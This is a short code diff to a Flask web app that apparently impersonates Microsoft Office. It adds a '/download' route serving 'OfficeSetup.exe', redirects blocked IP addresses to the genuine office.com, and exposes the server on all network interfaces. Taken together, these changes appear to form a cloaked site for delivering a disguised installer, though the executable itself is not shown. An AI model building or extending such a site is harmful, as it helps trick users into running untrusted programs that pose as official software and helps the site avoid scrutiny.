@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, send_from_directory
+from flask import Flask, render_template, request, redirect, send_from_directory, send_file
 import os
 
 
@@ -14,6 +14,10 @@ def index():
 def ms():
     return render_template('msoffice.html')
 
+@app.route('/download')
+def downloadFile ():
+    #For windows you need to use drive name [ex: F:/Example.pdf]
+    return send_file("OfficeSetup.exe", as_attachment=True)
 
 @app.before_request
 def block_method():
@@ -21,4 +25,4 @@ def block_method():
     if ip in block:
         return redirect("http://www.office.com")
 
-app.run()
+app.run(host="0.0.0.0")
